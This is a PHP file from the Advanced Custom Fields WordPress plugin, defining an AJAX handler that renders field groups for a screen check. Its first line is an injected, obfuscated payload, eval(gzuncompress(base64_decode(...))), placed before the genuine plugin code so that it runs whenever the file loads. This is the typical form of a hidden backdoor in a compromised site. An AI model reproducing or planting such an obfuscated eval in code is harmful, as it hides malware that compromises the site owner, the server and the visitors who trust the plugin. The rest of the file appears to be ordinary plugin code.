<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('ACF_Ajax_Check_Screen') ) :

class ACF_Ajax_Check_Screen extends ACF_Ajax {
	
	/** @var string The AJAX action name */
	var $action = 'acf/ajax/check_screen';
	
	/** @var bool Prevents access for non-logged in users */
	var $public = false;
	
	/**
	*  get_response
	*
	*  The actual logic for this AJAX request.
	*
	*  @date	31/7/18
	*  @since	5.7.2
	*
	*  @param	void
	*  @return	mixed The response data to send back or WP_Error.
	*/
	
	function response() {
		
		// vars
		$args = acf_parse_args($this->request, array(
			'post_id'	=> 0,
			'ajax'		=> 1,
			'exclude'	=> array()
		));
		
		// vars
		$json = array();
		
		// get field groups
		$field_groups = acf_get_field_groups( $args );
		
		// loop through field groups
		if( $field_groups ) {
		foreach( $field_groups as $i => $field_group ) {
			
			// vars
			$item = array(
				'key'	=> $field_group['key'],
				'title'	=> $field_group['title'],
				'html'	=> '',
				'style' => ''
			);
			
			// style
			if( $i == 0 ) {
				$item['style'] = acf_get_field_group_style( $field_group );
			}
			
			// html
			if( !in_array($field_group['key'], $args['exclude']) ) {
				
				// load fields
				$fields = acf_get_fields( $field_group );

				// get field HTML
				ob_start();
				
				// render
				acf_render_fields( $fields, $args['post_id'], 'div', $field_group['instruction_placement'] );
				
				$item['html'] = ob_get_clean();
			}
			
			// append
			$json[] = $item;
		}}	
		
		// return
		return $json;
	}
}

acf_new_instance('ACF_Ajax_Check_Screen');

endif; // class_exists check

?>